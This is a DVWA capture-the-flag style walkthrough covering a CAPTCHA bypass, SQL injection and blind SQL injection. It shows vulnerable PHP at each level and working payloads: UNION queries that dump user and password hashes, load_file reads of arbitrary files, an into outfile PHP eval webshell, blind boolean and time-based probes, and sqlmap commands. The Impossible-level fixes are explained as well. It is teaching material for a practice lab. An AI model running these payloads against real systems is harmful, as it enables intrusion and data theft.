		<input type="hidden" name="password_new" value="password">

		<input type="hidden" name="password_conf" value="password">

        <input type="hidden" name="passed_captcha" value="true">

		<input type="hidden" name="step" value="2"

		<input type="hidden" name="Change" value="Change">

	</form>

  </div>

</body>

</html>




High
Server-side core code

<?php

if( isset( $_POST[ 'Change' ] ) ) {
	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_conf = $_POST[ 'password_conf' ];

	// Check CAPTCHA from 3rd party
	$resp = recaptcha_check_answer(
		$_DVWA[ 'recaptcha_private_key' ],
		$_POST['g-recaptcha-response']
	);

	if (
		$resp || 
		(
			$_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
			&& $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
		)
	){
		// CAPTCHA was correct. Do both new passwords match?
		if ($pass_new == $pass_conf) {
			$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			$pass_new = md5( $pass_new );

			// Update database
			$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";
			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

			// Feedback for user
			$html .= "<pre>Password Changed.</pre>";

		} else {
			// Ops. Password mismatch
			$html     .= "<pre>Both passwords must match.</pre>";
			$hide_form = false;
		}

	} else {
		// What happens when the CAPTCHA was entered incorrectly
		$html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
		$hide_form = false;
		return;
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>



It can be seen that the verification logic of the server is that when $resp (here refers to the verification result returned by Google) is false, and the parameter recaptcha_response_field is not equal to hidd3n_valu3 (or the User-Agent parameter of the http header is not equal to reCAPTCHA), the verification code is considered If the input is wrong, otherwise, it is considered that the verification code has passed the check.

exploit

After figuring out the verification logic, the rest is forged and bypassed. Since we cannot control the $resp parameter, we focus on the parameters recaptcha_response_field and User-Agent.

The first step is still to capture the packet



Change the parameter recaptcha_response_field and the User-Agent of the http header



Note: In the latest version of dvwa, this should be changed to g-recaptcha-response=hidd3n_valu3

Impossible
Server-side core code




<?php

if( isset( $_POST[ 'Change' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_new  = stripslashes( $pass_new );
	$pass_new  = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass_new  = md5( $pass_new );

	$pass_conf = $_POST[ 'password_conf' ];
	$pass_conf = stripslashes( $pass_conf );
	$pass_conf = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_conf ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass_conf = md5( $pass_conf );

	$pass_curr = $_POST[ 'password_current' ];
	$pass_curr = stripslashes( $pass_curr );
	$pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass_curr = md5( $pass_curr );

	// Check CAPTCHA from 3rd party
	$resp = recaptcha_check_answer(
		$_DVWA[ 'recaptcha_private_key' ],
		$_POST['g-recaptcha-response']
	);

	// Did the CAPTCHA fail?
	if( !$resp ) {
		// What happens when the CAPTCHA was entered incorrectly
		$html .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
		$hide_form = false;
		return;
	}
	else {
		// Check that the current password is correct
		$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
		$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
		$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
		$data->execute();

		// Do both new password match and was the current password correct?
		if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) {
			// Update the database
			$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
			$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
			$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
			$data->execute();

			// Feedback for the end user - success!
			$html .= "<pre>Password Changed.</pre>";
		}
		else {
			// Feedback for the end user - failed!
			$html .= "<pre>Either your current password is incorrect or the new passwords did not match.<br />Please try again.</pre>";
			$hide_form = false;
		}
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>


It can be seen that the Impossible level code adds the Anti-CSRF token mechanism to defend against CSRF attacks, and uses PDO technology to protect against sql injection. The verification process is finally no longer divided into two parts, the verification code cannot be bypassed, and the user is required to enter the previous password. Identity authentication is further strengthened.

SQL_Injection
SQL Injection, that is, SQL injection, means that the attacker destroys the structure of SQL query statements by injecting malicious SQL commands, so as to achieve the purpose of executing malicious SQL statements. The harm of SQL injection vulnerabilities is huge, often causing the entire database to be " Take off your pants", however, SQL injection is still one of the most common web vulnerabilities today.

According to the classification in SQLMap, there are five types of SQL injection:




UNION query SQL injection(可联合查询注入)
Stacked queries SQL injection(可多语句查询注入)
Boolean-based blind SQL injection(布尔型注入)
Error-based SQL injection(报错型注入)
Time-based blind SQL injection(基于时间延迟注入)


SQL injection routine utilization ideas


1. 寻找注入点,可以通过 web 扫描工具实现
2. 通过注入点,尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息.
3. 猜解关键数据库表及其重要字段与内容(常见如存放管理员账户的表名、字段名等信息)
4. 可以通过获得的用户信息,寻找后台登录.
5. 利用后台或了解的进一步信息,上传 webshell 或向数据库写入一句话木马,以进一步提权,直到拿到服务器权限.



manual injection ideas

The automatic injection artifact sqlmap is easy to use, but it is still necessary to master some ideas of manual injection. The following is a brief introduction to the steps of manual injection (non-blind injection).

1.判断是否存在注入,注入是字符型还是数字型
2.猜解SQL查询语句中的字段数
3.确定显示的字段顺序
4.获取当前数据库
5.获取数据库中的表
6.获取表中的字段名
7.获取数据

Low
Server-side core code

<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
	// Get input
	$id = $_REQUEST[ 'id' ];

	// Check database
	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Get values
		$first = $row["first_name"];
		$last  = $row["last_name"];

		// Feedback for end user
		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
	}

	mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>



It can be seen from the code that the passed parameter id is accepted through the REQUEST method, and then brought into the query through the sql statement, without any inspection and filtering of the parameter id from the client, and there is an obvious SQL injection.

exploit

Determine whether there is an injection, whether the injection is a character or a number

Enter 1, the query is successful:



Input 1' and '1' ='2, the query fails and the returned result is empty:



Enter 1'or '1'='1, the query is successful:



Multiple results are returned, indicating that there is character injection.

Note: For the difference between digital type, character type and search type, please refer to the following article: https://blog.csdn.net/change518/article/details/8116920

Guess the number of fields in an SQL query

Enter 1' or 1=1 order by 1 #, the query is successful:



Enter 1' or 1=1 order by 2 #, the query is successful Input 1' or 1=1 order by 3 #, the query fails:



It shows that there are only two fields in the executed SQL query statement, namely First name and Surname here. (Here you can also guess the number of fields by entering union select 1,2,3...)

Determines the order in which fields are displayed

Enter 1' union select 1,2 #, the query is successful:



It shows that the executed SQL statement is select First name, Surname from table where ID=’id’…

Get the current database

Input 1' union select 1,database() #, the query is successful:

Use another way 1' union select user(),database() #



Explain that the current database is dvwa. The union query combines two select query results. According to the above order by statement, we know that the query contains two columns. In order to realize the two column query results, we need to use the union query to combine another select we constructed .Note that when using the union query, it needs to have the same number of columns as the main query.

Get the tables in the database

Input 1' union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() #, the query is successful:



It shows that there are two tables in the database dvwa, guestbook and users.

Get the field names in the table

Input 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #, the query is successful:



Explain that there are 8 fields in the users table, namely user_id, first_name, last_name, user, password, avatar, last_login, failed_login.

retrieve data

Input 1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #, the query is successful:

or 1' union select null,concat_ws(char(32,58,32),user,password) from users #

or 1' union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users #



In this way, the data of user_id, first_name, last_name, password of all users in the users table are obtained.

Guess the root user

input 1' union select 1,group_concat(user,password) from mysql.user#

Get root user information:



Read files and write with webshell

Using the read and write functions of mysql requires certain permissions.

The secure_file_priv parameter is used to limit the specified directory that load_file, into outfile and other related read and write execution functions act on.



================================================================

When the value of secure_file_priv is null, it means that mysqld is not allowed to import|export
When the value of secure_file_priv is /tmp/, it means that the import/export of mysqld can only occur in the /tmp/ directory
When the value of secure_file_priv is /, it means that the import/export directory of mysqld is limited to the entire disk where it is located
When the value of secure_file_priv has no specific value, it means that there is no restriction on the import|export of mysqld

===============================================================


View the current value of secure-file-priv by command show global variables like '%secure%';



Since I am using the environment built by PHPStudy, when MySQL has not set secure_file_priv, the default is NULL

Modify secure_file_priv to the specified directory:

Configuration file under Windows: ../MySQL/my.ini

Configuration file under Linux: /etc/mysql/my.cnf (the location and path of my.cnf under different Linux are different, so I will not list them here)

Add secure_file_priv in [mysqld] = Note that it is empty here, which means that it can be imported and exported to any directory, and restart the mysql service

The load_file() function reads an arbitrary file

1' union select 1, load_file('C:\\phpStudy\\PHPTutorial\\WWW\\dvwa\\index.php')#



Use the into outfile() function to write a sentence to get the webshell

If you don’t know the path, first get the absolute path of the website by reporting an error: 1' union select 'xx', 2 into outfile 'xx'#



Get the path C:\phpStudy\PHPTutorial\WWW\dvwa\vulnerabilities\sqli\source\low.php

Directly into outfile One sentence to the root directory 1' union select 1,'<?php @eval($_POST["cmd"]);?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\ x.php'#

The query fails because single quotes will cause closure. Note that the cmd in a sentence cannot be single quotes, or use double quotes in the whole sentence 1' union select 1,"<?php @eval($_POST['cmd']); ?>" into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#

Or use encoding, such as hexadecimal encoding 1' union select 1,0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#



sqlmap

sqlmap -u "http://<IP地址!!!>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<自己的sessionID!!!>" --batch



--cookie : inject with cookie
--batch : don't ask for user input, use default behavior



Medium
Server-side core code

<?php

if( isset( $_POST[ 'Submit' ] ) ) {
	// Get input
	$id = $_POST[ 'id' ];

	$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

	$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
	$result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Display values
		$first = $row["first_name"];
		$last  = $row["last_name"];

		// Feedback for end user
		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
	}

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>


It can be seen that the Medium-level code uses the mysql_real_escape_string function to escape the special symbols \x00,\n,\r,\,',",\x1a, and the front-end page has a drop-down selection form, hoping to control the user input of.

exploit

Although the front end uses a drop-down selection menu, we can still change parameters by capturing packets and submit maliciously constructed query parameters.

Determine whether there is an injection, whether the injection is a character or a number

Capture packet change parameter id to 1' or 1=1, report error Change packet capture parameter id to 1 or 1=1 #, query is successful



It means that there is digital injection. Since it is digital injection, the mysql_real_escape_string function on the server side is useless, because digital injection does not need quotation marks.

Guess the number of fields in an SQL query

Capture packets and change parameter id to 1 order by 2 #, the query is successful:



Capture the packet and change the parameter id to 1 order by 3 #, an error is reported, indicating that there are only two fields in the executed SQL query statement, namely First name and Surname here.

Determines the order in which fields are displayed

Capture packets and change parameter id to 1 union select 1,2 #, the query is successful:



It shows that the executed SQL statement is select First name, Surname from table where ID=id…

Get the current database

Capture packets and change parameter id to 1 union select 1,database() #

Get the tables in the database

Capture packets and change parameter id to 1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

Get the field names in the table

Capture packet change parameter id to 1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' # , query failed



This is because the single quote is escaped and becomes \'.

You can use hexadecimal to bypass, change the parameter id to 1 for packet capture union select 1, group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #



Explain that there are 8 fields in the users table, namely user_id, first_name, last_name, user, password, avatar, last_login, failed_login.

retrieve data

Change the parameter id of packet capture to 1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #

sqlmap

Capture the packet and save the data to 1.txt

sqlmap -r 1.txt


-r request-file Load from HTTP request file

High
Server-side core code

<?php

if( isset( $_SESSION [ 'id' ] ) ) {
	// Get input
	$id = $_SESSION[ 'id' ];

	// Check database
	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
	$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Get values
		$first = $row["first_name"];
		$last  = $row["last_name"];

		// Feedback for end user
		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>


It can be seen that compared with the Medium level code, the High level only adds LIMIT 1 to the SQL query statement, hoping to control the output of only one result.

exploit

Although LIMIT 1 is added, we can use # to comment it out. Since the process of manual injection is basically the same as that of Low level, the last step demonstrates the acquisition of data directly.

Enter 1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # , the query is successful:



What needs to be mentioned is that the query submission page of the High level is not the same as the query result display page, and the 302 jump is not executed. The purpose of this is to prevent general sqlmap injection, because sqlmap cannot be used in the injection process The results of the query are obtained on the query submission page. Without feedback, there is no way to inject further.

Second-order injection can be performed by specifying --second-url

sqlmap -r /root/1.txt -p id --second-url "http://<server address>/dvw/vulnerabilities/sqli/"

Impossible
Server-side core code


<?php

if( isset( $_GET[ 'Submit' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$id = $_GET[ 'id' ];

	// Was a number entered?
	if(is_numeric( $id )) {
		// Check the database
		$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
		$data->bindParam( ':id', $id, PDO::PARAM_INT );
		$data->execute();
		$row = $data->fetch();

		// Make sure only 1 result is returned
		if( $data->rowCount() == 1 ) {
			// Get values
			$first = $row[ 'first_name' ];
			$last  = $row[ 'last_name' ];

			// Feedback for end user
			$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
		}
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>


It can be seen that the Impossible level code adopts PDO technology, which draws a clear boundary between code and data, and effectively prevents SQL injection. At the same time, only when the number of query results returned is one, it will be successfully output, which effectively prevents "take off pants" ", the addition of the Anti-CSRFtoken mechanism further improves security.

SQL_Injection(Blind)
SQL Injection (Blind), that is, SQL blind injection, differs from general injection in that ordinary injection attackers can directly see the execution results of injection statements on the page, while in blind injection, attackers usually cannot obtain the results from the displayed page. There is no way to know the execution result, or even whether the injection statement is executed, so the difficulty of blind injection is higher than that of general injection. Most of the existing SQL injection vulnerabilities on the Internet are SQL blind injection.

Manual blind injection ideas

The process of manual blind injection is like you are chatting with a robot, this robot knows a lot, but can only answer "yes" or "no", so you need to ask it such questions, such as "the first letter of the database name Is it a?", through this mechanical inquiry, you can finally get the data you want.

Blind injections are divided into Boolean-based blind injections, time-based blind injections, and error-based blind injections. Due to the limitations of the experimental environment, only Boolean-based blind injections and time-based blind injections are demonstrated here.

The following briefly introduces the steps of manual blind injection (comparable with the previous manual injection):

1. Determine whether there is an injection, whether the injection is a character or a number
2. Guess the current database name
3. Guess the table name in the database
4. Guess the field name in the table
5. Guess the data
Low
Server-side core code





<?php

if( isset( $_GET[ 'Submit' ] ) ) {
	// Get input
	$id = $_GET[ 'id' ];

	// Check database
	$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

	// Get results
	$num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
	if( $num > 0 ) {
		// Feedback for end user
		$html .= '<pre>User ID exists in the database.</pre>';
	}
	else {
		// User wasn't found, so the page wasn't!
		header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

		// Feedback for end user
		$html .= '<pre>User ID is MISSING from the database.</pre>';
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>


It can be seen that the code at the Low level does not check or filter the parameter id, and there is an obvious SQL injection vulnerability. At the same time, there are only two results returned by the SQL statement query, User ID exists in the database. and User ID is MISSING from the database. So here is the blind SQL injection vulnerability.

exploit

Boolean-based blind injection

Determine whether there is an injection, whether the injection is a character or a number

Enter 1 to show that the corresponding user exists
Enter 1' and 1=1 # , display exists
Enter 1' and 1=2 # , the display does not exist
Indicates that there is a character-type SQL blind injection.

Guess the current database name

If you want to guess the database name, you must first guess the length of the database name, and then guess the characters one by one.

Input 1' and length(database())=1 # , the display does not exist;
Enter 1' and length(database())=2 # , the display does not exist;
Enter 1' and length(database())=3 # , the display does not exist;
Enter 1' and length(database())=4 # , the display exists:
Indicates that the length of the database name is 4.

The following uses the binary method to guess the database name.

Enter 1' and ascii(substr(database(),1,1))>97 # , it shows existence, indicating that the ascii value of the first character of the database name is greater than 97 (the ascii value of the lowercase letter a);

Input 1' and ascii(substr(database(),1,1))<122 # , it shows existence, indicating that the ascii value of the first character of the database name is less than 122 (the ascii value of the lowercase letter z);

Input 1' and ascii(substr(database(),1,1))<109 # , it shows existence, indicating that the ascii value of the first character of the database name is less than 109 (the ascii value of the lowercase letter m);

Input 1' and ascii(substr(database(),1,1))<103 # , display exists, indicating that the ascii value of the first character of the database name is less than 103 (the ascii value of the lowercase letter g);

Enter 1' and ascii(substr(database(),1,1))<100 # , the display does not exist, indicating that the ascii value of the first character of the database name is not less than 100 (the ascii value of the lowercase letter d);

Enter 1' and ascii(substr(database(),1,1))>100 # , the display does not exist, indicating that the ascii value of the first character of the database name is not greater than 100 (the ascii value of the lowercase letter d), so the database The ascii value of the first character of the name is 100, which is the lowercase letter d.
Repeat the above steps, you can guess the complete database name (dvwa).

Guess the table name in the database

First guess the number of tables in the database:


1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在

1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 显示存在


Indicates that there are two tables in the database

Then guess the table names one by one:

1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #

1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # display does not exist

…

1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # Display exists
Note that the length of the first table name is 9.

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # Display exists

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<122 # Display exists

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<109 # Display exists

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<103 # display does not exist

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103 # display does not exist
Indicates that the first character of the name of the first table is a lowercase letter g.

Repeat the above steps to guess the two table names (guestbook, users).

Guess the field names in the table

First guess the number of fields in the table:

1' and (select count(column_name) from information_schema.columns where table_name= 'users')=1 # Display does not exist

…

1' and (select count(column_name) from information_schema.columns where table_name= 'users')=8 # show existence
Explain that the users table has 8 fields.

Then guess the field names one by one:

1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1 # display does not exist

…

1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7 # Display exists
Indicates that the first field of the users table is 7 characters long.

Using the dichotomy method, you can guess all the field names.

Guess the data

Also with dichotomy. Time-based blinds can also be used:

Determine whether there is an injection, whether the injection is a character or a number

Enter 1' and sleep(2) # , feel the obvious delay;

Type 1 and sleep(2) # , no delay;

Indicates that there is a time-based blind injection of character type.

Guess the current database name

First guess the length of the data name:

1' and if(length(database())=1,sleep(2),1) # no delay
1' and if(length(database())=2,sleep(2),1) # no delay
1' and if(length(database())=3,sleep(2),1) # no delay
1' and if(length(database())=4,sleep(2),1) # noticeable delay
Indicates that the length of the database name is 4 characters.

Then use the dichotomy to guess the database name:

1' and if(ascii(substr(database(),1,1))>97,sleep(2),1)# Obvious delay
…
1' and if(ascii(substr(database(),1,1))<100,sleep(2),1)# no delay
1' and if(ascii(substr(database(),1,1))>100,sleep(2),1)# no delay
Indicates that the first character of the database name is a lowercase letter d.
…
Repeat the above steps to guess the database name.

Guess the table name in the database

First guess the number of tables in the database:

1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(2),1)# no delay

1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(2),1)# Obvious delay
Explain that there are two tables in the database. Then guess the table names one by one:

1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(2),1) # no delay
…
1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(2),1) # Obvious delay
It shows that the length of the first table name is 9 characters. The table name can be guessed by using the dichotomy method.

Guess the field names in the table

First guess the number of fields in the table:

1' and if((select count(column_name) from information_schema.columns where table_name= 'users')=1,sleep(2),1)# no delay
…
1' and if((select count(column_name) from information_schema.columns where table_name= 'users')=8,sleep(2),1)# Obvious delay
Explain that there are 8 fields in the users table. Then guess the field names one by one

1' and if(length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1,sleep(2),1) # no delay
…
1' and if(length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7,sleep(2),1) # Obvious delay
It shows that the length of the first field of the users table is 7 characters. The name of each field can be guessed by using the dichotomy method.

Guess the data

The same method of dichotomy is used.

sqlmap

sqlmap -u "http://<IP address!!!>/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<your own sessionID!!!>"

Medium
Server-side core code


<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}

?>



It can be seen that the Medium-level code uses the mysql_real_escape_string function to escape the special symbols \x00,\n,\r,\,',",\x1a, and the front-end page has a drop-down selection form, hoping to control the user input of.

exploit

Although the front end uses a drop-down selection menu, we can still change the parameter id by capturing packets and submit maliciously constructed query parameters.

The detailed blind injection process has been introduced before, and here are a few brief demonstrations.

The first is a Boolean-based blind

Capture packets and change parameter id to 1 and length(database())=4 # , it shows existence, indicating that the length of the database name is 4 characters;

Capture the packet and change the parameter id to 1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # , display exists, indicating the first table name in the data 9 characters long;

Capture the packet and change the parameter id to 1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 # , (0×7573657273 is the hexadecimal system of users), which shows that it exists, indicating that there are 8 uers tables field.

Then time-based blinds

Capture the packet and change the parameter id to 1 and if(length(database())=4,sleep(5),1) # , which is obviously delayed, indicating that the length of the database name is 4 characters;

Change the parameter id to 1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # , obvious delay , indicating that the length of the first table name in the data is 9 characters;

Capture the packet and change the parameter id to 1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) # , there is an obvious delay, indicating that the uers table has 8 fields.

sqlmap

Capture the packet and save the data to 1.txt

sqlmap -r 1.txt

-r request-file Load from HTTP request file
High
Server-side core code



<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>



It can be seen that the code at the High level uses the cookie to pass the parameter id. When the SQL query result is empty, the function sleep(seconds) will be executed to disturb the time-based blind injection. At the same time, LIMIT 1 is added to the SQL query statement , hoping to control only one result output.

exploit

Although LIMIT 1 is added, we can use # to comment it out. However, since the server executes the sleep function, the accuracy of time-based blind injection will be affected. Here we only demonstrate Boolean-based blind injection:

Capture the packet and change the parameter id in the cookie to 1' and length(database())=4 #, it shows that it exists, indicating that the length of the database name is 4 characters;

Capture the packet and change the parameter id in the cookie to 1' and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # , display exists, indicating that the first in the data A table name is 9 characters long;

Capture the packet and change the parameter id in the cookie to 1' and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 # , (0×7573657273 is the hexadecimal system of users), it shows that it exists, indicating that the uers table has 8 fields.

Impossible
Server-side core code

<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();

        // Get results
        if( $data->rowCount() == 1 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>



It can be seen that the code at the Impossible level uses PDO technology, which draws a clear boundary between code and data, and effectively prevents SQL injection. The addition of the Anti-CSRF token mechanism further improves security.

Weak_Session_IDs
